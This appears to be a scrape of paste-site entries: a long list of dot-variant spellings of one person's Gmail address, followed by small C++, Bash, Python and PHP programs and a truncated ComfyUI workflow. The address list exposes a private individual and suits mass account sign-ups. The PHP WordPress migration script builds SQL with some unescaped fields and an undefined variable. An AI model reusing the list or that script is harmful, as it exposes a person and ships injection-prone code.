<a href=""mailto:ham.id.sare.m.03@gmail.com"">ham.id.sare.m.03@gmail.com</a>
<a href=""mailto:ha.mi.d.sa.r.em0.3@gmail.com"">ha.mi.d.sa.r.em0.3@gmail.com</a>
<a href=""mailto:ham.ids.a.r.em.0.3@gmail.com"">ham.ids.a.r.em.0.3@gmail.com</a>
<a href=""mailto:h.am.i.d.s.a.r.e.m03@gmail.com"">h.am.i.d.s.a.r.e.m03@gmail.com</a>
<a href=""mailto:h.a.m.i.ds.ar.e.m03@gmail.com"">h.a.m.i.ds.ar.e.m03@gmail.com</a>
<a href=""mailto:hamids.arem0.3@gmail.com"">hamids.arem0.3@gmail.com</a>
<a href=""mailto:ham.i.d.sa.r.em.03@gmail.com"">ham.i.d.sa.r.em.03@gmail.com</a>
<a href=""mailto:ham.idsarem03@gmail.com"">ham.idsarem03@gmail.com</a>
<a href=""mailto:hamids.a.r.em.03@gmail.com"">hamids.a.r.em.03@gmail.com</a>
<a href=""mailto:ha.mi.d.s.are.m.0.3@gmail.com"">ha.mi.d.s.are.m.0.3@gmail.com</a>
<a href=""mailto:ham.id.s.a.r.em.03@gmail.com"">ham.id.s.a.r.em.03@gmail.com</a>
<a href=""mailto:ha.mid.s.a.r.e.m03@gmail.com"">ha.mid.s.a.r.e.m03@gmail.com</a>
<a href=""mailto:ha.m.i.d.sa.rem.0.3@gmail.com"">ha.m.i.d.sa.rem.0.3@gmail.com</a>
<a href=""mailto:hamid.sare.m03@gmail.com"">hamid.sare.m03@gmail.com</a>
<a href=""mailto:hamidsa.re.m0.3@gmail.com"">hamidsa.re.m0.3@gmail.com</a>
<a href=""mailto:h.a.mi.ds.arem.03@gmail.com"">h.a.mi.ds.arem.03@gmail.com</a>
<a href=""mailto:h.amid.sa.r.em.03@gmail.com"">h.amid.sa.r.em.03@gmail.com</a>
<a href=""mailto:h.am.i.d.s.ar.e.m03@gmail.com"">h.am.i.d.s.ar.e.m03@gmail.com</a>
<a href=""mailto:ham.id.s.a.r.e.m0.3@gmail.com"">ham.id.s.a.r.e.m0.3@gmail.com</a>
<a href=""mailto:h.amids.ar.em03@gmail.com"">h.amids.ar.em03@gmail.com</a>
<a href=""mailto:h.a.m.ids.are.m.0.3@gmail.com"">h.a.m.ids.are.m.0.3@gmail.com</a>
<a href=""mailto:hami.ds.a.rem.0.3@gmail.com"">hami.ds.a.rem.0.3@gmail.com</a>
<a href=""mailto:h.a.mids.a.r.em0.3@gmail.com"">h.a.mids.a.r.em0.3@gmail.com</a>
<a href=""mailto:h.amid.sarem.0.3@gmail.com"">h.amid.sarem.0.3@gmail.com</a>
<a href=""mailto:h.am.ids.a.re.m.0.3@gmail.com"">h.am.ids.a.re.m.0.3@gmail.com</a>
<a href=""mailto:hamids.a.rem03@gmail.com"">hamids.a.rem03@gmail.com</a>
<a href=""mailto:h.a.m.ids.a.rem03@gmail.com"">h.a.m.ids.a.rem03@gmail.com</a>
<a href=""mailto:hami.dsa.rem03@gmail.com"">hami.dsa.rem03@gmail.com</a>
<a href=""mailto:ha.mi.dsa.re.m03@gmail.com"">ha.mi.dsa.re.m03@gmail.com</a>
<a href=""mailto:h.am.i.ds.arem.03@gmail.com"">h.am.i.ds.arem.03@gmail.com</a>
<a href=""mailto:h.am.i.ds.a.r.e.m03@gmail.com"">h.am.i.ds.a.r.e.m03@gmail.com</a>
<a href=""mailto:ha.m.id.sar.e.m0.3@gmail.com"">ha.m.id.sar.e.m0.3@gmail.com</a>
<a href=""mailto:h.a.midsar.em0.3@gmail.com"">h.a.midsar.em0.3@gmail.com</a>
<a href=""mailto:h.a.m.ids.a.re.m0.3@gmail.com"">h.a.m.ids.a.re.m0.3@gmail.com</a>
<a href=""mailto:ha.m.id.sa.re.m.03@gmail.com"">ha.m.id.sa.re.m.03@gmail.com</a>
<a href=""mailto:ha.m.i.d.sar.em0.3@gmail.com"">ha.m.i.d.sar.em0.3@gmail.com</a>
<a href=""mailto:ha.mi.dsa.r.em0.3@gmail.com"">ha.mi.dsa.r.em0.3@gmail.com</a>
<a href=""mailto:h.ami.dsa.r.em03@gmail.com"">h.ami.dsa.r.em03@gmail.com</a>
<a href=""mailto:hami.dsarem.03@gmail.com"">hami.dsarem.03@gmail.com</a>
<a href=""mailto:h.am.idsar.e.m0.3@gmail.com"">h.am.idsar.e.m0.3@gmail.com</a>
<a href=""mailto:ha.m.i.ds.a.r.em.0.3@gmail.com"">ha.m.i.ds.a.r.em.0.3@gmail.com</a>
<a href=""mailto:h.ami.d.s.a.rem.03@gmail.com"">h.ami.d.s.a.rem.03@gmail.com</a>
<a href=""mailto:ha.mids.a.r.e.m03@gmail.com"">ha.mids.a.r.e.m03@gmail.com</a>
<a href=""mailto:h.amids.are.m0.3@gmail.com"">h.amids.are.m0.3@gmail.com</a>
<a href=""mailto:ha.m.i.dsar.e.m.03@gmail.com"">ha.m.i.dsar.e.m.03@gmail.com</a>
<a href=""mailto:h.am.i.dsarem.03@gmail.com"">h.am.i.dsarem.03@gmail.com</a>
<a href=""mailto:ha.m.i.ds.a.r.e.m.0.3@gmail.com"">ha.m.i.ds.a.r.e.m.0.3@gmail.com</a>
<a href=""mailto:h.a.mid.s.a.rem0.3@gmail.com"">h.a.mid.s.a.rem0.3@gmail.com</a>
<a href=""mailto:hamid.sare.m.0.3@gmail.com"">hamid.sare.m.0.3@gmail.com</a>
<a href=""mailto:h.a.mi.d.sar.e.m0.3@gmail.com"">h.a.mi.d.sar.e.m0.3@gmail.com</a>
<a href=""mailto:h.amid.s.are.m03@gmail.com"">h.amid.s.are.m03@gmail.com</a>
<a href=""mailto:h.a.m.i.ds.arem.03@gmail.com"">h.a.m.i.ds.arem.03@gmail.com</a>
<a href=""mailto:h.a.m.i.d.sar.e.m03@gmail.com"">h.a.m.i.d.sar.e.m03@gmail.com</a>
<a href=""mailto:h.a.midsa.r.e.m.0.3@gmail.com"">h.a.midsa.r.e.m.0.3@gmail.com</a>
<a href=""mailto:h.a.m.i.ds.a.r.em03@gmail.com"">h.a.m.i.ds.a.r.em03@gmail.com</a>
<a href=""mailto:ha.mid.s.ar.em.03@gmail.com"">ha.mid.s.ar.em.03@gmail.com</a>
<a href=""mailto:ha.mi.dsar.em03@gmail.com"">ha.mi.dsar.em03@gmail.com</a>
<a href=""mailto:h.a.m.id.s.a.rem.03@gmail.com"">h.a.m.id.s.a.rem.03@gmail.com</a>
<a href=""mailto:h.ami.ds.ar.e.m0.3@gmail.com"">h.ami.ds.ar.e.m0.3@gmail.com</a>
<a href=""mailto:ha.m.ids.a.re.m03@gmail.com"">ha.m.ids.a.re.m03@gmail.com</a>
<a href=""mailto:ham.i.ds.a.re.m0.3@gmail.com"">ham.i.ds.a.re.m0.3@gmail.com</a>
<a href=""mailto:h.ami.ds.are.m03@gmail.com"">h.ami.ds.are.m03@gmail.com</a>
<a href=""mailto:ha.midsar.e.m.0.3@gmail.com"">ha.midsar.e.m.0.3@gmail.com</a>
<a href=""mailto:h.amid.sarem0.3@gmail.com"">h.amid.sarem0.3@gmail.com</a>
<a href=""mailto:ha.mid.sa.re.m0.3@gmail.com"">ha.mid.sa.re.m0.3@gmail.com</a>
<a href=""mailto:ha.mi.ds.arem.03@gmail.com"">ha.mi.ds.arem.03@gmail.com</a>
<a href=""mailto:ha.mid.s.are.m.0.3@gmail.com"">ha.mid.s.are.m.0.3@gmail.com</a>
<a href=""mailto:h.a.m.i.dsa.r.em03@gmail.com"">h.a.m.i.dsa.r.em03@gmail.com</a>
<a href=""mailto:h.a.m.i.d.s.arem0.3@gmail.com"">h.a.m.i.d.s.arem0.3@gmail.com</a>
<a href=""mailto:ha.m.id.sarem.03@gmail.com"">ha.m.id.sarem.03@gmail.com</a>
<a href=""mailto:h.a.m.id.sare.m03@gmail.com"">h.a.m.id.sare.m03@gmail.com</a>
<a href=""mailto:h.ami.ds.a.rem.0.3@gmail.com"">h.ami.ds.a.rem.0.3@gmail.com</a>
<a href=""mailto:hamid.s.ar.e.m.03@gmail.com"">hamid.s.ar.e.m.03@gmail.com</a>
<a href=""mailto:h.am.i.d.sa.r.e.m.03@gmail.com"">h.am.i.d.sa.r.e.m.03@gmail.com</a>
<a href=""mailto:hamids.a.r.e.m0.3@gmail.com"">hamids.a.r.e.m0.3@gmail.com</a>
<a href=""mailto:h.am.i.d.sarem.0.3@gmail.com"">h.am.i.d.sarem.0.3@gmail.com</a>
<a href=""mailto:h.am.i.dsa.r.e.m.0.3@gmail.com"">h.am.i.dsa.r.e.m.0.3@gmail.com</a>
<a href=""mailto:h.a.m.i.d.sar.em03@gmail.com"">h.a.m.i.d.sar.em03@gmail.com</a>
<a href=""mailto:ha.mi.d.sa.rem.0.3@gmail.com"">ha.mi.d.sa.rem.0.3@gmail.com</a>
<a href=""mailto:ha.m.id.sa.rem0.3@gmail.com"">ha.m.id.sa.rem0.3@gmail.com</a>
<a href=""mailto:h.a.m.i.d.s.arem.0.3@gmail.com"">h.a.m.i.d.s.arem.0.3@gmail.com</a>
<a href=""mailto:h.a.mi.dsar.e.m.0.3@gmail.com"">h.a.mi.dsar.e.m.0.3@gmail.com</a>
<a href=""mailto:h.a.m.id.s.a.r.e.m03@gmail.com"">h.a.m.id.s.a.r.e.m03@gmail.com</a>
<a href=""mailto:h.am.id.sa.re.m.03@gmail.com"">h.am.id.sa.re.m.03@gmail.com</a>
<a href=""mailto:ham.i.d.sare.m0.3@gmail.com"">ham.i.d.sare.m0.3@gmail.com</a>
<a href=""mailto:hami.ds.arem03@gmail.com"">hami.ds.arem03@gmail.com</a>
<a href=""mailto:h.a.m.idsare.m03@gmail.com"">h.a.m.idsare.m03@gmail.com</a>
<a href=""mailto:ha.m.i.d.sa.re.m.03@gmail.com"">ha.m.i.d.sa.re.m.03@gmail.com</a>
<a href=""mailto:h.ami.d.sar.em.0.3@gmail.com"">h.ami.d.sar.em.0.3@gmail.com</a>
<a href=""mailto:ha.m.idsa.re.m0.3@gmail.com"">ha.m.idsa.re.m0.3@gmail.com</a>
<a href=""mailto:ha.midsarem03@gmail.com"">ha.midsarem03@gmail.com</a>
<a href=""mailto:h.am.i.d.s.ar.e.m0.3@gmail.com"">h.am.i.d.s.ar.e.m0.3@gmail.com</a>
<a href=""mailto:h.amid.s.a.rem.03@gmail.com"">h.amid.s.a.rem.03@gmail.com</a>
<a href=""mailto:h.a.mid.sa.re.m0.3@gmail.com"">h.a.mid.sa.re.m0.3@gmail.com</a>
<a href=""mailto:h.am.idsa.r.em0.3@gmail.com"">h.am.idsa.r.em0.3@gmail.com</a>
<a href=""mailto:ham.id.s.a.rem0.3@gmail.com"">ham.id.s.a.rem0.3@gmail.com</a>
<a href=""mailto:hamid.sa.r.em.03@gmail.com"">hamid.sa.r.em.03@gmail.com</a>
<a href=""mailto:h.amidsar.em.0.3@gmail.com"">h.amidsar.em.0.3@gmail.com</a>
<a href=""mailto:h.ami.dsa.r.em.0.3@gmail.com"">h.ami.dsa.r.em.0.3@gmail.com</a>
<a href=""mailto:h.am.ids.a.r.em0.3@gmail.com"">h.am.ids.a.r.em0.3@gmail.com</a>
<a href=""mailto:h.a.mi.d.sarem03@gmail.com"">h.a.mi.d.sarem03@gmail.com</a>
<a href=""mailto:h.amidsarem0.3@gmail.com"">h.amidsarem0.3@gmail.com</a>
<a href=""mailto:ham.i.d.sare.m.0.3@gmail.com"">ham.i.d.sare.m.0.3@gmail.com</a>
<a href=""mailto:hami.ds.ar.e.m03@gmail.com"">hami.ds.ar.e.m03@gmail.com</a>
<a href=""mailto:ha.mids.a.r.em03@gmail.com"">ha.mids.a.r.em03@gmail.com</a>
<a href=""mailto:ham.i.d.s.ar.em03@gmail.com"">ham.i.d.s.ar.em03@gmail.com</a>
<a href=""mailto:ha.mi.d.s.are.m0.3@gmail.com"">ha.mi.d.s.are.m0.3@gmail.com</a>
<a href=""mailto:h.ami.d.sa.rem.0.3@gmail.com"">h.ami.d.sa.rem.0.3@gmail.com</a>
<a href=""mailto:h.a.mi.d.sarem.03@gmail.com"">h.a.mi.d.sarem.03@gmail.com</a>
<a href=""mailto:ham.idsar.e.m.0.3@gmail.com"">ham.idsar.e.m.0.3@gmail.com</a>
<a href=""mailto:hami.dsa.r.em.03@gmail.com"">hami.dsa.r.em.03@gmail.com</a>
<a href=""mailto:h.a.m.idsar.e.m03@gmail.com"">h.a.m.idsar.e.m03@gmail.com</a>
<a href=""mailto:h.a.m.i.dsare.m03@gmail.com"">h.a.m.i.dsare.m03@gmail.com</a>
<a href=""mailto:hamidsar.e.m0.3@gmail.com"">hamidsar.e.m0.3@gmail.com</a>
<a href=""mailto:h.amid.sa.r.e.m.03@gmail.com"">h.amid.sa.r.e.m.03@gmail.com</a>
<a href=""mailto:ha.mi.ds.ar.e.m03@gmail.com"">ha.mi.ds.ar.e.m03@gmail.com</a>
<a href=""mailto:h.a.m.i.ds.a.r.e.m.03@gmail.com"">h.a.m.i.ds.a.r.e.m.03@gmail.com</a>
<a href=""mailto:ha.mi.d.sarem.0.3@gmail.com"">ha.mi.d.sarem.0.3@gmail.com</a>
<a href=""mailto:hamid.s.ar.em.03@gmail.com"">hamid.s.ar.em.03@gmail.com</a>"
Qrw2Berr,Recursion: Insert num x and pow y and receive output,BojidarDosev,C++,Sunday 19th of November 2023 12:27:19 PM CDT,"#include <iostream>
using namespace std;

int pow(int x, int y)
{
	if (x == 1 || y==0)
	{
		return 1;
	}
	else if (y == 1)
	{
		return x;
	}
	else
	{
		return x * pow(x, y - 1);
	}
}


int main()
{
	int x, y;
	cout << ""Enter a num and its power: "";
	cin >> x; cin >> y;
	cout << "" Product is: "";
		cout<<pow(x, y);
		
}



"
GMRw9d9N,Android App Activity Launcher,metalx1000,Bash,Sunday 19th of November 2023 12:26:28 PM CDT,"#!/bin/bash
###################################################################### 
#Copyright (C) 2023  Kris Occhipinti
#https://filmsbykris.com

#This program is free software: you can redistribute it and/or modify
#it under the terms of the GNU General Public License as published by
#the Free Software Foundation version 3 of the License.

#This program is distributed in the hope that it will be useful,
#but WITHOUT ANY WARRANTY; without even the implied warranty of
#MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#GNU General Public License for more details.

#You should have received a copy of the GNU General Public License
#along with this program.  If not, see <http://www.gnu.org/licenses/>.
###################################################################### 

function error(){                                                                                                                            
  echo $*                                                                                                                                    
  exit 1                                                                                                                                     
} 

#check if devices is connected
adb get-state || error ""No Devices Connected""

#list packages
list=""$(adb shell dumpsys package | grep Activity|awk '{$1=$1;print}')""
list=""$(echo ""$list""|grep -v ""^knownActivityEmbeddingCerts=""|rev|awk '{print $1}'|rev)""
app=""$(echo ""$list""|sort -u|fzf --prompt ""Select an Activity: "")""
adb shell am start -a android.intent.action.MAIN -n ""$app"" 
"
QYnRsqkW,Quick Install Termux with adb on Android,metalx1000,Bash,Sunday 19th of November 2023 12:10:54 PM CDT,"#!/bin/bash
###################################################################### 
#Copyright (C) 2023  Kris Occhipinti
#https://filmsbykris.com

#This program is free software: you can redistribute it and/or modify
#it under the terms of the GNU General Public License as published by
#the Free Software Foundation version 3 of the License.

#This program is distributed in the hope that it will be useful,
#but WITHOUT ANY WARRANTY; without even the implied warranty of
#MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#GNU General Public License for more details.

#You should have received a copy of the GNU General Public License
#along with this program.  If not, see <http://www.gnu.org/licenses/>.
###################################################################### 

function error(){
  echo $*
  exit 1
}

function get_apk(){
  [[ ""$1"" ]] || exit 1
  app=""$1""
  url=""https://f-droid.org/en/packages/$app/""
  search=""https://f-droid.org/repo/com""
  url=""$(wget -qO- ""$url""|grep ""$search""|grep '.apk'|head -n1|cut -d\"" -f2)""
  [[ $url ]] || error fail 
  apk=""$(basename $url)""
  wget -c ""$url""
  adb install -g ""$apk""
}

adb get-state || error ""No Devices Connected""
get_apk com.termux
adb shell am start -a android.intent.action.MAIN -n com.termux/.app.TermuxActivity
get_apk com.termux.api
get_apk com.termux.boot
adb shell am start -a android.intent.action.MAIN -n com.termux.boot/.BootActivity

"
gTTkzKdJ,Mpscow travel,fenixD3,C++,Sunday 19th of November 2023 11:47:47 AM CDT,"#include <iostream>
#include <cmath>
#include <iomanip>

double get_normalized_angle(double x, double y)
{
    auto angle = std::atan2(y, x);
    if (angle > std::numbers::pi)
    {
        angle -= 2 * std::numbers::pi;
    }
    else if (angle <= -std::numbers::pi)
    {
        angle += 2 * std::numbers::pi;
    }
    return angle;
}

double get_min_distance(double start_x, double start_y, double finish_x, double finish_y)
{
    auto radius_start = std::hypot(start_x, start_y);
    auto radius_finish = std::hypot(finish_x, finish_y);

    auto way_through_center = radius_start + radius_finish;

    auto angle_start = get_normalized_angle(start_x, start_y);
    auto angle_finish = get_normalized_angle(finish_x, finish_y);
    auto angle_between = std::abs(angle_start - angle_finish);

    auto arc_length = radius_start * angle_between;
    auto way_through_arc = arc_length + std::abs(radius_start - radius_finish);

    return std::isless(way_through_center, way_through_arc) ? way_through_center : way_through_arc;
}

int main()
{
    int start_x, start_y, finish_x, finish_y;
    std::cin >> start_x >> start_y >> finish_x >> finish_y;

    std::cout << std::fixed << std::setprecision(12) << get_min_distance(start_x, start_y, finish_x, finish_y) << std::endl;
}
"
MTBTWLgY,Untitled,pacho_the_python,Python,Sunday 19th of November 2023 11:28:34 AM CDT,"def create_force_side(side, member, user_info_dict):
    condition = [current_side for current_side in user_info_dict if member in user_info_dict[current_side]]

    if len(condition) == 0:
        condition.clear()
        if side not in user_info_dict:
            user_info_dict[side] = [member]
        else:
            user_info_dict[side].append(member)

    return user_info_dict


def create_force_user(member, side, user_info_dict):
    for current_side in user_info_dict:
        if member in user_info_dict[current_side]:
            if len(user_info_dict[current_side]) > 1:
                user_info_dict[current_side].pop(member)
                break
            else:
                del user_info_dict[current_side]
                break

    if side in user_info_dict:
        user_info_dict[side].append(member)
    else:
        user_info_dict[side] = [member]

    print(f""{member} joins the {side} side!"")


def force_book():
    user_info_dict = {}

    while True:
        command = input()

        if command == 'Lumpawaroo':
            break

        if '|' in command:
            command = command.split(' | ')
            side = command[0]
            member = command[1]
            create_force_side(side, member, user_info_dict)

        elif '->' in command:
            command = command.split(' -> ')
            member = command[0]
            side = command[1]
            create_force_user(member, side, user_info_dict)

    for data in user_info_dict:
        print(f'Side: {data}, Members: {len(user_info_dict[data])}')
        for name in user_info_dict[data]:
            print(f'! {name}')


force_book()
"
pspfvHrH,QRcd,Hristomir,Python,Sunday 19th of November 2023 11:04:21 AM CDT,"import pyqrcode
import png
from pyqrcode import QRCode

address = ""https://www.mobile.bg/pcgi/mobile.cgi?act=4&adv=21684763065393651&slink=u8qou0""

url = pyqrcode.create(address)
url.png(""accord.png"", scale=8)"
9Gr4vcFZ,MigrateBlogToWordPress Script,EurenikZ,PHP,Sunday 19th of November 2023 10:48:31 AM CDT,"﻿<?php

/*
1. ""wp_posts"" leeren
2. ""wp_term_relationships"" leeren
3. ""wp_comments"" leeren
4. ""wp_term_taxonomy"" importieren
5. ""wp_terms"" importieren
6. Script aufrufen
7. Blog aufrufen
*/

/*
EINSTELLUNGEN START
Tabellen und Spalten müssen im Script entsprechend angepasst werden.
*/

$domain = 'MeinBlog.tld';

// Verbindung zur alten Datenbank herstellen
$oldDb = new mysqli('localhost', 'BENUTZERNAME_HIER', 'PASSWORT_HIER', 'DATENBANK_HIER');

// Verbindung zur neuen Datenbank herstellen
$newDb = new mysqli('localhost', 'BENUTZERNAME_HIER', 'PASSWORT_HIER', 'DATENBANK_HIER');

/*
EINSTELLUNGEN ENDE
*/

// Überprüfen, ob die Verbindungen erfolgreich waren
if ($oldDb->connect_error || $newDb->connect_error) {
    die('Verbindungsfehler: ' . $oldDb->connect_error . ' | ' . $newDb->connect_error);
}

// SQL-Abfrage für den Datenbanktransfer
$query = ""SELECT * FROM tipps"";
$result = $oldDb->query($query);

// Überprüfen, ob die Abfrage erfolgreich war
if (!$result) {
    die('Abfragefehler: ' . $oldDb->error);
}

$i_blog = 0;
$i_comments = 0;

// Blog-Beiträge migrieren
while ($row = $result->fetch_assoc()) {
	$i_blog++;
    // Inhalte ersetzen und formatieren
    $postTitle = mysqli_real_escape_string($newDb, $row['titel']);
    $postContent = mysqli_real_escape_string($newDb, $row['inhalt']);
    $postDate = date('Y-m-d H:i:s', $row['datum']);
    $postModified = date('Y-m-d H:i:s', $row['lastedit']);
    $postAuthor = 1;

    // Weitere Inhalte generieren
    $postName = strtolower(str_replace(
        ['--', 'ß', 'ä', 'ü', 'ö', 'Ä', 'Ü', 'Ö'],
        ['-','ss','ae','ue','oe','ae','ue','oe'],
        preg_replace('/[^A-Za-z0-9\-]/', '', str_replace(
            ' ',
            '-',
            str_replace('&', 'und', str_replace(
                '&amp;',
                'and',
                str_replace(
                    ' / ',
                    '-',
                    str_replace(
                        '.',
                        '-',
                        str_replace(
                            ' – ',
                            '-',
                            str_replace(
                                ' - ',
                                '-',
                                str_replace(
                                    '+',
                                    'plus',
                                    $postTitle
                                )
                            )
                        )
                    )
                )
            )
        ))
    )));

    $guid = 'https://'.strtolower($domain).'/?p=' . $row['id'];

    // SQL-Abfrage für den Datenbankeinfügung in die neue Tabelle wp_posts
    $insertQuery = ""INSERT INTO wp_posts (ID, post_author, post_date, post_date_gmt, post_content, post_title, post_excerpt, post_status, comment_status, ping_status, post_password, post_name, to_ping, pinged, post_modified, post_modified_gmt, post_content_filtered, post_parent, guid, menu_order, post_type, post_mime_type, comment_count)
                    VALUES (NULL, $postAuthor, '$postDate', '$postDate', '$postContent', '$postTitle', '', 'publish', 'open', 'open', '', '$postName', '', '', '$postModified', '$postModified', '', 0, '$guid', 0, 'post', '', 0)"";

    // Überprüfen, ob die Abfrage erfolgreich war
    if (!$newDb->query($insertQuery)) {
        die('Fehler beim Einfügen: ' . $newDb->error);
    }

    // Kategorie-ID aus der alten Tabelle ""tipps""
    $alteKategorieId = $row['kategorie_id'];

    // Neue Kategorie-ID in ""wp_terms"" um 1 erhöhen
    $neueKategorieId = $alteKategorieId + 1;

    // SQL-Abfrage für den Datenbankeinfügung in die neue Tabelle wp_term_relationships
    $insertTermRelationshipsQuery = ""INSERT INTO wp_term_relationships (object_id, term_taxonomy_id, term_order)
                                    VALUES (LAST_INSERT_ID(), $neueKategorieId, 0)"";

    // Überprüfen, ob die Abfrage erfolgreich war
    if (!$newDb->query($insertTermRelationshipsQuery)) {
        die('Fehler beim Einfügen in wp_term_relationships: ' . $newDb->error);
    }

    // SQL-Abfrage für die Aktualisierung der count-Spalte in wp_term_taxonomy
    $updateTermTaxonomyQuery = ""UPDATE wp_term_taxonomy SET count = count + 1 WHERE term_id = $neueKategorieId"";

    // Überprüfen, ob die Abfrage erfolgreich war
    if (!$newDb->query($updateTermTaxonomyQuery)) {
        die('Fehler beim Aktualisieren von wp_term_taxonomy: ' . $newDb->error);
    }
}

// Kommentare migrieren
// SQL-Abfrage für die Kommentare in comments
$commentsQuery = ""SELECT * FROM comments ORDER BY datum ASC"";
$commentsResult = $oldDb->query($commentsQuery);

// SQL-Abfrage für die Antworten in comments_answers
$answersQuery = ""SELECT * FROM comments_answers ORDER BY datum ASC"";
$answersResult = $oldDb->query($answersQuery);

// Antworten in ein Array umwandeln
$answersArray = array();
while ($answerRow = $answersResult->fetch_assoc()) {
    $answersArray[] = $answerRow;
}

// Schleife für Kommentare
while ($commentRow = $commentsResult->fetch_assoc()) {
	$i_comments++;
    // Inhalte formatieren
    $commentPostID = $commentRow['tipp_id'];
    $commentAuthor = mysqli_real_escape_string($newDb, $commentRow['name']);
    $commentDate = date('Y-m-d H:i:s', $commentRow['datum']);
    $commentContent = mysqli_real_escape_string($newDb, $commentRow['kommentar']);
    $commentEmail = $commentRow['email'];

    // SQL-Abfrage für den Datenbankeinfügung in die neue Tabelle wp_comments
    $insertCommentQuery = ""INSERT INTO wp_comments (comment_post_ID, comment_author, comment_date, comment_date_gmt, comment_content, comment_author_email, comment_approved, comment_type, comment_parent, user_id)
                           VALUES ($commentPostID, '$commentAuthor', '$commentDate', '$commentDate', '$commentContent', '$commentEmail', 1, 'comment', 0, $user_id)"";

    // Überprüfen, ob die Abfrage erfolgreich war
    if (!$newDb->query($insertCommentQuery)) {
        die('Fehler beim Einfügen von Kommentaren: ' . $newDb->error);
    }

    // Schleife für Antworten
    foreach ($answersArray as $answerRow) {
        // Wenn die Antwort zur aktuellen Kommentar-ID gehört
        if ($answerRow['comment_id'] == $commentRow['id']) {
            // Inhalte formatieren
            $answerPostID = $answerRow['tipp_id'];
            $answerAuthor = mysqli_real_escape_string($newDb, $answerRow['name']);
            $answerDate = date('Y-m-d H:i:s', $answerRow['datum']);
            $answerContent = mysqli_real_escape_string($newDb, $answerRow['antwort']);
            $answerEmail = $answerRow['email'];

            // SQL-Abfrage für den Datenbankeinfügung in die neue Tabelle wp_comments für Antworten
            $insertAnswerQuery = ""INSERT INTO wp_comments (comment_post_ID, comment_author, comment_date, comment_date_gmt, comment_content, comment_author_email, comment_approved, comment_type, comment_parent, user_id)
                                 VALUES ($answerPostID, '$answerAuthor', '$answerDate', '$answerDate', '$answerContent', '$answerEmail', 1, 'comment', LAST_INSERT_ID(), $user_id)"";

            // Überprüfen, ob die Abfrage erfolgreich war
            if (!$newDb->query($insertAnswerQuery)) {
                die('Fehler beim Einfügen von Antworten: ' . $newDb->error);
            }
        }
    }
}

// Verbindungen schließen
$oldDb->close();
$newDb->close();

echo 'Migration abgeschlossen! '.$i_blog.' Blog-Beiträge und '.$i_comments.' Kommentare wurden migriert.';
?>"
yx5i1waV,NP,VMaksimoski008,C++,Sunday 19th of November 2023 10:37:02 AM CDT,"#include <bits/stdc++.h>

#define pb push_back
#define eb emplace_back
#define sz(x) (int)x.size()
#define all(x) x.begin(), x.end()
#define uniq(x) x.erase(unique(all(x)), x.end())
#define rall(x) x.rbegin(), x.rend()
//#define int long long

using namespace std;

using ll = long long;
using ull = unsigned long long;
using ld = long double;
using pii = pair<int, int>;
using pll = pair<ll, ll>;

const int mod = 750083;
const int LOG = 20;
const int maxn = 1e5 + 5;
const double eps = 1e-9;

void setIO() {
    ios_base::sync_with_stdio(false);
    cin.tie(0);
    cout.tie(0);
}

int32_t main() {
    setIO();

    string a, b;
    cin >> a >> b;
   
    int n = sz(a), m = sz(b);
    int dp_min[n+1][m+1], dp[n+1][m+1];
    bool used[n+1][m+1];
    memset(dp, 0, sizeof(dp));
    memset(used, 0, sizeof(used));
    dp_min[0][0] = 0;
    used[0][0] = 1, used[n][m] = 1;

    for(int i=0; i<=n; i++) { 
        for (int j=0; j<=m; j++) {  
            if(!i) dp_min[i][j] = j; 
            else if(!j) dp_min[i][j] = i; 
            else if (a[i-1] == b[j-1]) dp_min[i][j] = 1 + dp_min[i-1][j-1]; 
            else dp_min[i][j] = 1 + min(dp_min[i-1][j], dp_min[i][j-1]); 
        } 
    } 

    queue<pii> q;
    q.push({ n, m });
    while(!q.empty()) {
        int i = q.front().first;
        int j = q.front().second;
        q.pop();

        if(a[i-1] == b[j-1]) {
            if(dp_min[i-1][j-1] + 1 == dp_min[i][j] && !used[i-1][j-1]) {
                q.push({ i-1, j-1 });
                used[i-1][j-1] = 1;
            }
        } else {
            if(dp_min[i-1][j] + 1 == dp_min[i][j] && !used[i-1][j]) {
                q.push({ i-1, j });
                used[i-1][j] = 1;
            }
            if(dp_min[i][j-1] + 1 == dp_min[i][j] && !used[i][j-1]) {
                q.push({ i, j-1 });
                used[i][j-1] = 1;
            }
        }
    }

    for(int i=0; i<=n; i++) {
        for(int j=0; j<=m; j++) cout << used[i][j];
        cout << '\n';
    }

    dp[0][0] = 1;
    for(int i=0; i<=n; i++) {
        for(int j=0; j<=m; j++) {
            if(!used[i][j]) continue;
            if(!i && !j) continue;

            if(!i && used[i][j-1]) {
                dp[i][j] += dp[i][j-1];
                dp[i][j] %= mod;
            }

            if(!j && used[i-1][j]) {
                dp[i][j] += dp[i-1][j];
                dp[i][j] %= mod;
            }

            if(!i || !j) continue;

            if(a[i-1] == b[j-1] && used[i-1][j-1]) {
                dp[i][j] += dp[i-1][j-1];
                dp[i][j] %= mod;
            } else {
                if(used[i-1][j]) {
                    dp[i][j] += dp[i-1][j];
                    dp[i][j] %= mod;
                }

                if(used[i][j-1]) {
                    dp[i][j] += dp[i][j-1];
                    dp[i][j] %= mod;
                }
            }
        }
    }

    cout << dp[n][m] << '\n';
    return 0;
}"
7uAVYB7J,ComfyUI workflow for using OpenPose,Satscape,JSON,Sunday 19th of November 2023 10:22:55 AM CDT,"{
  ""last_node_id"": 62,
  ""last_link_id"": 140,
  ""nodes"": [
    {
      ""id"": 34,
      ""type"": ""ControlNetLoader"",
      ""pos"": [
        290,
        -420
      ],
      ""size"": {
        ""0"": 457.5661315917969,
        ""1"": 58
      },
      ""flags"": {},
      ""order"": 0,
      ""mode"": 0,
      ""outputs"": [
        {
          ""name"": ""CONTROL_NET"",
          ""type"": ""CONTROL_NET"",
          ""links"": [
            60
          ],
          ""shape"": 3
        }
      ],
      ""properties"": {
        ""Node name for S&R"": ""ControlNetLoader""
      },
      ""widgets_values"": [
        ""control_v11p_sd15_openpose_fp16.safetensors""
      ]
    },
    {
      ""id"": 55,
      ""type"": ""VAEDecode"",
      ""pos"": [
        1555.358897816051,
        191.0334347811612
      ],
      ""size"": {
        ""0"": 210,
        ""1"": 46
      },
      ""flags"": {},
      ""order"": 11,
      ""mode"": 0,
      ""inputs"": [
        {
          ""name"": ""samples"",
          ""type"": ""LATENT"",
          ""link"": 125
        },
        {
          ""name"": ""vae"",
          ""type"": ""VAE"",
          ""link"": 126
        }
      ],
      ""outputs"": [
        {
          ""name"": ""IMAGE"",
          ""type"": ""IMAGE"",
          ""links"": [
            140
          ],
